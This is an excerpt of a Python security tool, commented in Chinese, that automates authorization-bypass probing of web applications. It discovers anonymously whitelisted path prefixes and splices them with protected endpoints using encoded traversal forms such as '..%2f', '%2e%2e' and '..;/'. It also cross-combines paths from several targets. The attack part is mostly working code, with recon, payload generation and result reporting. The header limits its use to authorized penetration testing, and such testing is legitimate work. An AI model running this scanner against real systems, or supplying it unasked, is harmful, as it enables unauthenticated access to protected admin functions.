...
# -*- coding: utf-8 -*-
"""
whitelist_bypass_v6_1_cross.py —— 免鉴权白名单借道 × 编码穿越 × 路径拼接 一体化越权探测 v6.1
================================================================
单文件独立运行，无需 authz_bypass_v3_4.py / whitelist_probe.py。
仅限已授权的安全测试 / 渗透测试场景使用。

v6.1 新增：跨目标交叉探测（多目标输入时的"交叉优先"编排）
  触发条件：目标数 >= 2 且未加 --no-cross / --probe-only。
  · 阶段A  跨目标轻量侦察 —— 逐目标「根级垃圾指纹 + URL 逐级垃圾探测」
    提取白名单路径，汇成全局实测前缀池 verified（每目标仅 ~3-10 次匿名请求）；
  · 阶段B  交叉探测风暴 —— 全局池前缀（其他目标的实测白名单 / 逐级路径 /
    手工前缀）× 本目标每个切割点后段 × 21 种编码穿越形态，即
    "两条 URL 路径互相拼接构造新 URL"：
      /upload(来自URL②实测) × ..%2f × api/v3/trae/test(来自URL①路径)
        → GET /upload/..%2fapi/v3/trae/test
    完整复用阶段二判定体系（三基线/evaluate/重定向链/★二次复核/熔断/报告），
    报告文件带 _cross 后缀与常规探测区分；
  · 阶段C  交互确认 —— 询问是否继续常规探测（y=完整两阶段 / n=仅交叉结果）；
    --cross-auto 跳过询问自动继续；--no-cross 关闭交叉优先回到原流程；
    非交互终端（管道/无人值守）默认跳过常规探测。

v6.0 探测逻辑重构（三级优先借道）：
  ① URL 逐级探测 —— 阶段一先对用户输入 URL 的自身路径逐级探测
     （/app、/app/admin、/app/admin/user …），真实路径是否匿名穿透，
     命中即为高价值实测白名单前缀（来源=URL逐级）；
  ② 多级多段拆分动态拼接 —— 借道插件第一/二梯队：
     实测前缀 × 目标路径每个切割点后段 × (17 种单级形态 + 4 种深度形态)；
     URL 自身逐级前缀(前段) × 互补后段 × 经典形态兜底；
  ③ 内置字典拼接 —— 最后才在 prefix_cap 预算内按内置前缀展开，
     全面丰富"借道免鉴权白名单前缀 + ../或%2e%2e等编码绕过 + 其它路径拼接"。
...
用法
----------------------------------------------------------------
python whitelist_bypass_v6_1_cross.py --url http://t1/app/admin/user/list
python whitelist_bypass_v6_1_cross.py --url-file targets.txt --cookie "sid=xxx" --high-cookie "sid=admin"
python whitelist_bypass_v6_1_cross.py                                # 交互模式：逐个输入目标URL
python whitelist_bypass_v6_1_cross.py --url http://t/... --probe-only             # 仅阶段一
python whitelist_bypass_v6_1_cross.py --url http://t/... --no-discover \
       --whitelist-prefix static --whitelist-prefix public                 # 仅阶段二(手工前缀)
python whitelist_bypass_v6_1_cross.py --url http://t/... --combine --probe-method # 组合变形+方法覆盖
python whitelist_bypass_v6_1_cross.py --url U1 --url U2                     # 交叉优先：A侦察→B交叉→C询问
python whitelist_bypass_v6_1_cross.py --url U1 --url U2 --cross-auto        # 交叉后自动常规
python whitelist_bypass_v6_1_cross.py --url U1 --url U2 --no-cross          # 关闭交叉，原流程
"""
...
# [v6] 多级深度穿越形态（仅用于动态拼接梯队）：白名单前缀后需回退多级
# 才能落到目标后段时，单级 ../ 不够，两级/混合深度穿越是实战高频补刀。
# 结构同 DETOUR_FORMS：(描述, 拼接串, 分隔符是否已含)
DYN_DEEP_FORMS = (
    ("../../两级", "/../..", False),
    ("%2e%2e/%2e%2e两级编码", "/%2e%2e/%2e%2e", False),
    ("..;/..;/两级分号", "/..;/..;", False),
    ("../%2e%2e混合深度", "/../%2e%2e", False),
)
...
def url_hierarchy(url):
    """[v6] 目标 URL 自身路径的全部逐级前缀（不含完整路径本身）。
    /app/admin/user/list → ['app', 'app/admin', 'app/admin/user']"""
    segs = [s for s in urlparse(url).path.split("/") if s]
    return ["/".join(segs[:i]) for i in range(1, len(segs))]


async def probe_url_hierarchy(manager, base, url, root_denied, probe_tag):
    """[v6] 逐级探测用户输入 URL 的每一级真实前缀是否为免鉴权白名单。
    与字典爆破互补：这些路径真实存在于目标，一旦匿名穿透即为最高价值
    借道前缀（阶段二第一梯队对其做多级多段动态拼接）。
    判定复用 classify：垃圾路径路由穿透 + 前缀根旁证 + 登录页排除。"""
    found = []
    junk = probe_tag + os.urandom(5).hex()
    for level in url_hierarchy(url):
        jr = await manager.send(build_url(base, "", f"{level}/{junk}"),
                                "GET", kind="anon")
        if jr["error"]:
            continue
        root_r = None
        if jr["code"] in (ROUTED_CODES | OK_CODES) \
                or is_login_redirect(jr["location"]) or jr["code"] in DENY_CODES:
            root_r = await manager.send(build_url(base, "", level) + "/",
                                        "GET", kind="anon")
        hit = classify(root_denied, jr, root_r)
        if not hit:
            continue
        conf, signal, ev = hit
        found.append({"前缀": level, "上下文": "/", "来源": "URL逐级",
                      "信号": signal, "置信度": conf,
                      "证据": f"逐级 {ev}", "备注": ""})
    return found
...
async def probe_target(idx, total, target, manager, args, out_base):
    ...
    # ---- [v6] URL 逐级探测：先于字典爆破，探测目标自身路径逐级前缀 ----
    hier = await probe_url_hierarchy(manager, base, target, root_denied,
                                     args.probe_tag)
    if hier:
        print(f"[+] URL 逐级探测命中 {len(hier)} 级白名单: "
              + ", ".join("/" + h["前缀"] for h in hier))
    results.extend(hier)
...
class DetourPlugin:
    ...
    [v6 重构] 三级优先借道：
      第一梯队 动态拼接 —— 实测/手工前缀 × 目标路径"每个切割点的后段"
               × (17 单级形态 + 4 深度形态)：前缀不再只接完整目标路径，
               /{前缀}{enc}/user/list、/{前缀}{enc}/list 等后段全展开；
      第二梯队 前后段互拼 —— URL 自身逐级前缀(前段 segs[:i]) × 互补后段
               (segs[i:]) × 经典形态，阶段一关闭/未命中时兜底真实前缀；
      第三梯队 内置拼接 —— 实测前缀×全路径保留，内置字典前缀最后才在
               prefix_cap 预算内展开。"""
    category = "借道前缀"
    ...
    def generate(self, ctx):
        ...
        def join_detour(front, enc, sep, back):
            """前段 + 穿越编码 + 后段 的动态拼接：
            sep=True 表示穿越串自带分隔符，后段不再补斜杠。"""
            return f"/{front}{enc}" + (back if sep else "/" + back)

        # ---- 第一梯队 [v6]：实测前缀 × 多级后段 动态拼接 ----
        # /app/admin/user/list 的后段 = admin/user/list, user/list, list
        dyn_forms = list(DETOUR_FORMS) + list(DYN_DEEP_FORMS)
        backs = ["/".join(segs[j:]) for j in range(len(segs)) if segs[j:]]
        dyn_cap = ctx.get("dyn_cap", 300)
        if hi_list and backs and len(hi_list) * len(backs) * len(dyn_forms) > dyn_cap:
            # 组合规模超预算时降级为经典形态 + 深度形态，保覆盖、控总量
            dyn_forms = list(DETOUR_FORMS[:8]) + list(DYN_DEEP_FORMS)
        for p in hi_list:
            for back in backs:
                for desc, enc, sep in dyn_forms:
                    out.append(build(self.category, f"/{p} {desc} +/{back}",
                                     join_detour(p, enc, sep, back), ctx))

        # ---- 第二梯队 [v6]：URL 自身逐级前缀 前后段互补拆分 ----
        # 即使逐级探测未命中/阶段一被 --no-discover 关闭，目标路径自身的
        # 真实前缀仍是高价值借道候选；未实测故仅配经典+深度形态控量。
        classic = list(DETOUR_FORMS[:8]) + list(DYN_DEEP_FORMS)
        for i in range(1, len(segs)):
            front = "/".join(segs[:i])
            if front in hi_set:
                continue  # 已在第一梯队全形态覆盖
            back = "/".join(segs[i:])
            for desc, enc, sep in classic:
                out.append(build(self.category, f"/{front} {desc} +/{back}",
                                 join_detour(front, enc, sep, back), ctx))

        # ---- 第三梯队：实测前缀×全路径（原语义）+ 内置字典预算内展开 ----
        for p in hi_list:
            for desc, enc, sep in DETOUR_FORMS:
                out.append(build(self.category, f"/{p} {desc}",
                                 f"/{p}{enc}" + (sj if sep else op), ctx))
        # [v6] 动态梯队不占内置配额：预算只扣"实测×全路径"（保持 [D4] 原语义），
        # 内置字典前缀始终保有 prefix_cap 兜底展开空间，不会被动态拼接饿死。
        base_n = len(hi_list) * len(DETOUR_FORMS)
...
def generate_variants(url, categories=None, hi_prefixes=None, probe_method=False,
                      combine=False, combine_cap=200, prefix_cap=150, dyn_cap=300):
...
async def run_phase2(idx, total, target, manager, args, out_base,
                     ...
                     variants_override=None, tag="", label="阶段二"):
    """[v6.1] 新增 variants_override/tag/label 三个可选参数：
    variants_override 非空时跳过 generate_variants，直接用预生成变形
    （交叉探测：交叉池前缀 × 本目标切割点后段 × 编码穿越形态）；
    tag 追加进报告文件名（交叉探测传 "_cross"）；label 用于横幅与汇总。"""
    print("\n" + "=" * 78)
    print(f" [{idx}/{total}] {label}：自动越权绕过  {target}")
    print("=" * 78)
    ...
    if base_low["error"]:
        ...
        return {"phase": 2, "label": label, "target": target, "ok": False,
    ...
    if base_low["code"] in OK_CODES:
        ...
        return {"phase": 2, "label": label, "target": target, "ok": True,
                "baseline_open": True, "rows": []}

    # ---- 变形生成 ----
    hi_prefixes = merge_prefixes(manual_prefixes, found_prefixes)
    if variants_override is not None:
        # [v6.1] 交叉探测：变形已由 generate_cross_variants 预生成
        # （交叉池前缀 × 本目标每个切割点后段 × 编码穿越形态）
        variants = round_robin_slice(list(variants_override), args.variant_cap)
        if hi_prefixes:
            shown = ", ".join("/" + p for p in hi_prefixes[:12])
            print(f"[*] [v6.1] 交叉借道池 {len(hi_prefixes)} 个: {shown}"
                  + (" …" if len(hi_prefixes) > 12 else ""))
    else:
        # [D4/D2修复] 实测前缀折叠 + 手工前缀保留，合并去重
        if hi_prefixes:
            shown = ", ".join("/" + p for p in hi_prefixes[:12])
    ...
    if hits:
        ...
        print("  " + "-" * 74)
        for r in hits[:40]:
            tagv = f"{r['verdict'][0]}{r['confidence']}"
            print(f"  {pad(tagv, 12)}{pad(r['cat'], 10)}{pad(r['desc'][:40], 44)}{r['code']}")
        if len(hits) > 40:
    ...
    # [v6.1] tag 追加：交叉探测报告与常规报告隔离（如 _01_bypass_cross.csv）
    pf = f"{out_base}_{idx:02d}_bypass{tag}"
    ...
    return {"phase": 2, "label": label, "target": target, "ok": True, "rows": rows,
            "stars": len(stars), "needs": len(hits) - len(stars),
            "circuit": broken, "report": pf}


# ---------------------------------------------------------------------------
# [v6.1] 跨目标交叉探测：多目标"交叉优先"编排（阶段A侦察 → 阶段B交叉风暴 → 阶段C确认）
# ---------------------------------------------------------------------------
CROSS_CATEGORY = "交叉借道"


def ask_yes_no(prompt, default=False):
    """[v6.1] 交互式 y/N 确认。非终端（管道/无人值守）或 EOF/中断时按 default。"""
    try:
        if not (sys.stdin and sys.stdin.isatty()):
            print(f"[?] {prompt}（非交互环境，默认{'继续' if default else '跳过'}）")
            return default
        raw = input(f"[?] {prompt} [y/N]: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    return raw in ("y", "yes", "是", "继续", "go")


def build_cross_pool(cur_target, targets, verified, hier_map, manual_prefixes):
    """[v6.1] 当前目标的交叉借道池（档序 = 截断优先级，低档先被裁）：
      档1 实测白名单前缀 —— 阶段A任一目标（含本目标）URL 逐级探测验证
          匿名放行（高/中置信），父子折叠后入池；
      档2 其他目标 URL 逐级路径 —— 未实测但真实存在，正是"两条 URL 路径
          互拼"的素材（本目标自身逐级路径不入档2，常规阶段二
          DetourPlugin 第二梯队已覆盖）；
      档3 手工 --whitelist-prefix（未实测）。
    返回 [{"prefix","tier","src"}]。"""
    pool, seen = [], set()
    ...
    def add(p, tier, src):
        ...
        if n and n not in seen:
            seen.add(n)
            pool.append({"prefix": n, "tier": tier, "src": src})

    for p in fold_prefixes(list(verified)):
        add(p, 1, verified[p]["src"])
    for i, tgt in enumerate(targets, 1):
        if tgt == cur_target:
            continue
        for p in hier_map.get(tgt, []):
            add(p, 2, f"#{i}逐级")
    for p in (manual_prefixes or []):
        add(p, 3, "手工")
    return pool


def generate_cross_variants(url, cross_pool, dyn_cap=300):
    """[v6.1] 交叉借道变形：交叉池前缀 × 当前目标每个切割点后段 × 编码穿越形态。
    即"两条 URL 路径互相拼接构造新 URL"的实现：
      /upload(来自URL②实测) × ..%2f × api/v3/trae/test(来自URL①路径)
        → GET /upload/..%2fapi/v3/trae/test
    backs[0] = 本目标全路径，向后逐级变短（切割点全覆盖）；
    池按档序、形态按 DETOUR_FORMS 实战命中率序展开，总量超 dyn_cap 时
    先降级为经典8+深度4形态，仍超则截掉（低档前缀×低优先形态）尾部。"""
    origin, segs, query = split_path(url)
    if not segs:
        segs = [""]
    ctx = {"origin": origin, "segs": segs, "query": query,
           "orig_path": "/" + "/".join(segs)}
    backs = ["/".join(segs[j:]) for j in range(len(segs)) if segs[j:]]
    if not cross_pool or not backs:
        return []
    forms = list(DETOUR_FORMS) + list(DYN_DEEP_FORMS)
    if len(cross_pool) * len(backs) * len(forms) > dyn_cap:
        forms = list(DETOUR_FORMS[:8]) + list(DYN_DEEP_FORMS)
    out, seen = [], set()
    for item in cross_pool:                     # 档序 = 截断优先级
        p = item["prefix"]
        for back in backs:                      # backs[0]=全路径，向后逐级变短
            for desc, enc, sep in forms:
                raw = f"/{p}{enc}" + (back if sep else "/" + back)
                if raw in seen:
                    continue
                seen.add(raw)
                out.append(build(CROSS_CATEGORY,
                                 f"/{p}←{item['src']} {desc}+/{back}",
                                 raw, ctx))
    return out[:dyn_cap]


async def cross_recon(targets, manager, args):
    """[v6.1] 阶段A：跨目标轻量侦察（每目标 ≈ 1 + 层级数 次匿名请求）。
    根级垃圾路径确认全局鉴权 → URL 逐级垃圾探测提取白名单前缀。
    返回 (verified, hier_map)：
      verified[norm前缀] = {"src": "#i实测", "conf": 高/中, "ev": 证据}
      hier_map[target]   = 该目标全部逐级路径（未实测，交叉互拼素材）"""
    verified, hier_map = {}, {}
    print("\n" + "=" * 78)
    print(f" 阶段A：跨目标轻量侦察（URL 逐级白名单提取，{len(targets)} 个目标）")
    print("=" * 78)
    for i, tgt in enumerate(targets, 1):
        parsed = urlparse(tgt)
        base = f"{parsed.scheme}://{parsed.netloc}"
        root = await manager.send(
            f"{base}/{args.probe_tag}{os.urandom(5).hex()}",
            "GET", kind="anon", retries=1)
        hier_map[tgt] = url_hierarchy(tgt)
        if root["error"]:
            print(f"  [{i}/{len(targets)}] {parsed.path} 根探测失败"
                  f"（{root['error']}），本目标仅作逐级路径素材")
            continue
        root_denied = root["code"] in DENY_CODES or is_login_redirect(root["location"])
        hits = await probe_url_hierarchy(manager, base, tgt, root_denied,
                                         args.probe_tag)
        for r in hits:
            if r["置信度"] in ("高", "中"):
                key = norm_seg(r["前缀"])
                if key and key not in verified:
                    verified[key] = {"src": f"#{i}实测", "conf": r["置信度"],
                                     "ev": r["证据"]}
        print(f"  [{i}/{len(targets)}] {parsed.path}"
              + ("  [全局鉴权确认]" if root_denied else "  [弱信号]")
              + "  逐级白名单命中: "
              + (", ".join("/" + r["前缀"] for r in hits) or "无"))
    if verified:
        print("[+] 全局实测白名单前缀池: "
              + ", ".join(f"/{p}({verified[p]['src']})" for p in sorted(verified)))
    else:
        print("[*] 未实测到白名单前缀，交叉池退化为"
              "「其他目标逐级路径互拼 + 手工前缀」")
    return verified, hier_map


async def cross_first_main(args, targets, manager, out_base, summary):
    """[v6.1] 多目标"交叉优先"编排（A → B → C）：
    A 跨目标轻量侦察：从每条 URL 逐级探测提取白名单路径，汇成全局池；
    B 交叉探测风暴：全局池前缀 × 每条 URL 路径互拼借道（优先执行）；
    C 交互确认：询问是否继续常规探测；--cross-auto 自动继续，
      非交互终端默认跳过。常规阶段完整复用原 probe_target + run_phase2。"""
    total = len(targets)

    # ===== 阶段A：轻量侦察 =====
    verified, hier_map = await cross_recon(targets, manager, args)

    # ===== 阶段B：交叉探测风暴 =====
    print("\n" + "=" * 78)
    print(" 阶段B：跨目标交叉探测（其他URL前缀 × 本URL路径互拼接）")
    print("=" * 78)
    for i, tgt in enumerate(targets, 1):
        pool = build_cross_pool(tgt, targets, verified, hier_map,
                                args.whitelist_prefix)
        if not pool:
            print(f"\n[{i}/{total}] {tgt} 交叉池为空，跳过交叉探测")
            continue
        tiers = {k: sum(1 for p in pool if p["tier"] == k) for k in (1, 2, 3)}
        print(f"\n[*] [{i}/{total}] {urlparse(tgt).path} 交叉池 {len(pool)} 个"
              f"（实测{tiers[1]} / 逐级互拼{tiers[2]} / 手工{tiers[3]}）: "
              + ", ".join(f"/{p['prefix']}←{p['src']}" for p in pool[:10])
              + (" …" if len(pool) > 10 else ""))
        variants = generate_cross_variants(tgt, pool, dyn_cap=args.dyn_cap)
        if not variants:
            continue
        r2 = await run_phase2(i, total, tgt, manager, args, out_base,
                              manual_prefixes=[p["prefix"] for p in pool],
                              found_prefixes=[],
                              variants_override=variants, tag="_cross",
                              label="阶段B·交叉探测")
        summary.append(r2)

    # ===== 阶段C：询问是否常规探测 =====
    if args.cross_auto:
        print("\n[*] --cross-auto：跳过询问，自动继续常规探测")
        go = True
    else:
        go = ask_yes_no("交叉探测完成，是否继续常规探测？"
                        "（逐目标完整两阶段：字典白名单爆破 + 全类别变形风暴）")
    if not go:
        print("[*] 已按用户选择跳过常规探测，仅输出交叉探测结果")
        return 0
...
def print_summary(summary, total, args):
    """[v6.1] 汇总打印（自原 async_main 尾部抽出，常规/交叉两流程共用）"""
    print("\n" + "=" * 78)
    ...
    for s in summary:
        if s.get("phase") == 1:
            ...
            if not s.get("ok"):
                print(f"  ✕ [{s.get('label', '阶段二')}] {s['target']}: {s.get('reason', '失败')}")
            elif s.get("baseline_open"):
                print(f"  · [{s.get('label', '阶段二')}] {s['target']}: 基线本就放行，无越权可测")
            else:
                mark = "★" if s.get("stars") else "·"
                extra = f"；熔断: {s['circuit']}" if s.get("circuit") else ""
                print(f"  {mark} [{s.get('label', '阶段二')}] {s['target']}: "
                      f"★{s.get('stars', 0)} △{s.get('needs', 0)}"
                      f" / 变形 {len(s.get('rows', []))}{extra}"
                      + (f" → {s['report']}.csv" if s.get("report") else ""))
...
def prompt_targets():
    ...
    print(" · 输入 >=2 个目标且未加 --no-cross 时自动进入交叉优先流程")
    print("   （阶段A侦察提取白名单 → 阶段B跨目标交叉探测 → 询问常规探测）")
    print(" · 其余参数仍可用（如 --cookie/--proxy/--combine），例如：")
    print("   python whitelist_bypass_v6_1_cross.py --cookie \"sid=xxx\"")
    print("=" * 78)
    targets = []
    while True:
        try:
...
def build_argparser():
    ap = argparse.ArgumentParser(
        prog="whitelist_bypass_v6_1_cross.py",
        description="免鉴权白名单借道 × 编码穿越 × 路径拼接 一体化越权探测 v6.1（仅限已授权测试）；"
                    "多目标默认交叉优先（A侦察→B交叉→C询问常规）；"
                    "不带 --url/--url-file 启动时进入交互模式",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python whitelist_bypass_v6_1_cross.py                                # 交互模式逐个输入目标\n"
            "  python whitelist_bypass_v6_1_cross.py --url http://t1/app/admin/user/list\n"
            "  python whitelist_bypass_v6_1_cross.py --url-file targets.txt --cookie \"sid=xxx\" --high-cookie \"sid=admin\"\n"
            "  python whitelist_bypass_v6_1_cross.py --url http://t/... --probe-only\n"
            "  python whitelist_bypass_v6_1_cross.py --url http://t/... --no-discover --whitelist-prefix static\n"
            "  python whitelist_bypass_v6_1_cross.py --url http://t/... --combine --probe-method --evidence\n"
            "  python whitelist_bypass_v6_1_cross.py --url U1 --url U2                    # 交叉优先：A侦察→B交叉→C询问\n"
            "  python whitelist_bypass_v6_1_cross.py --url U1 --url U2 --cross-auto       # 交叉后自动常规\n"
            "  python whitelist_bypass_v6_1_cross.py --url U1 --url U2 --no-cross         # 关闭交叉，原流程\n"
            "类别代号: D借道前缀 C目录穿越 B..;/穿越 R编码解码 S路径拼接 A分号参数\n"
            "          U解码跳跃 H头部注入 N内容协商 I方法 X组合 G交叉借道"))
    ...
    ph.add_argument("--no-cross", dest="no_cross", action="store_true",
                    help="[v6.1] 多目标时跳过交叉优先流程，按原常规两阶段逐目标执行")
    ph.add_argument("--cross-auto", dest="cross_auto", action="store_true",
                    help="[v6.1] 交叉探测后不询问，自动继续常规探测（无人值守）")
    ...
    st.add_argument("--categories", help="限定类别，逗号分隔（D/C/B/R/S/A/I/X/G 或中文全称）")
    ...
    st.add_argument("--dyn-cap", dest="dyn_cap", type=int, default=300,
                    help="[v6] 动态拼接梯队规模阈值：实测前缀×后段×全形态超出时"
                         "自动降级为经典+深度形态（保覆盖控总量）；"
                         "[v6.1] 交叉探测变形总量同样受此约束")
...
async def async_main(args):
    ...
    if total >= 2 and not args.no_cross and not args.probe_only:
        print(" 模式: 交叉优先（A 侦察提取白名单 → B 跨目标交叉探测 → C 询问常规探测）")
    ...
    summary = []
    try:
        # [v6.1] 多目标默认"交叉优先"：A 轻量侦察 → B 交叉风暴 → C 询问常规探测
        if total >= 2 and not args.no_cross and not args.probe_only:
            rc = await cross_first_main(args, targets, manager, out_base, summary)
            print_summary(summary, total, args)
            return rc
